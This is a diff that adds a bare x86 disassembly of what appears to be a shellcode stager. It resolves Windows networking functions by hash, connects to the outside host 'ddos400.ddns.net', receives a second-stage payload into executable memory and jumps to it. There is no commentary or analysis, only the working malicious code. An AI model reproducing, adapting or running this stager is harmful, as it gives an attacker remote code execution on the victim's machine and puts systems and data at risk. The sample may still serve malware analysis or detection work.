@@ -1,0 +1,78 @@
+bbl_0x0000:
+    0x0000: cld
+    0x0001: call 0x88
+.db '`',137,229,'1',192,'d',139,'P0',139,'R',12,139,'R',20,139,'r(',15,183,'J&1',255,172,'<a|',2,', ',193,207,13,1,199,226,242,'RW',139,'R',16,139,'J<',139,'L',17,'x',227,'H',1,209,'Q',139,'Y ',1,211,139,'I',24,227,':I',139,'4',139,1,214,'1',255,172,193,207,13,1,199,'8',224,'u',246,3,'}',248,';}$u',228,'X',139,'X$',1,211,'f',139,12,'K',139,'X',28,1,211,139,4,139,1,208,137,'D$$[[aYZQ',255,224,'__Z',139,18,235,141
+bbl_0x0088:
+    0x0088: pop ebp
+    0x0089: push 0x3233
+    0x008e: push 0x5f327377
+    0x0093: push esp
+    0x0094: push 0x726774c
+    0x0099: call ebp
+    0x009b: mov eax, 0x190
+    0x00a0: sub esp, eax
+    0x00a2: push esp
+    0x00a3: push eax
+    0x00a4: push 0x6b8029
+    0x00a9: call ebp
+    0x00ab: push eax
+    0x00ac: push eax
+    0x00ad: push eax
+    0x00ae: push eax
+    0x00af: inc eax
+    0x00b0: push eax
+    0x00b1: inc eax
+    0x00b2: push eax
+    0x00b3: push 0xe0df0fea
+    0x00b8: call ebp
+    0x00ba: xchg eax, edi
+    0x00bb: call 0xd1
+.db 'ddos400.ddns.net',0
+bbl_0x00d1:
+    0x00d1: push 0x803428a9
+    0x00d6: call ebp
+    0x00d8: mov eax, dword ptr [eax + 0x1c]
+    0x00db: push 5
+    0x00dd: push eax
+    0x00de: push 0x911f0002
+    0x00e3: mov esi, esp
+    0x00e5: push 0x10
+    0x00e7: push esi
+    0x00e8: push edi
+    0x00e9: push 0x6174a599
+    0x00ee: call ebp
+    0x00f0: test eax, eax
+    0x00f2: je 0x100
+bbl_0x00f4:
+    0x00f4: dec dword ptr [esi + 8]
+    0x00f7: jne 0xe5
+bbl_0x00f9:
+    0x00f9: push 0x56a2b5f0
+    0x00fe: call ebp
+bbl_0x0100:
+    0x0100: push 0
+    0x0102: push 4
+    0x0104: push esi
+    0x0105: push edi
+    0x0106: push 0x5fc8d902
+    0x010b: call ebp
+    0x010d: mov esi, dword ptr [esi]
+    0x010f: push 0x40
+    0x0111: push 0x1000
+    0x0116: push esi
+    0x0117: push 0
+    0x0119: push 0xe553a458
+    0x011e: call ebp
+    0x0120: xchg eax, ebx
+    0x0121: push ebx
+    0x0122: push 0
+    0x0124: push esi
+    0x0125: push ebx
+    0x0126: push edi
+    0x0127: push 0x5fc8d902
+    0x012c: call ebp
+    0x012e: add ebx, eax
+    0x0130: sub esi, eax
+    0x0132: jne 0x122
+bbl_0x0134:
+    0x0134: ret
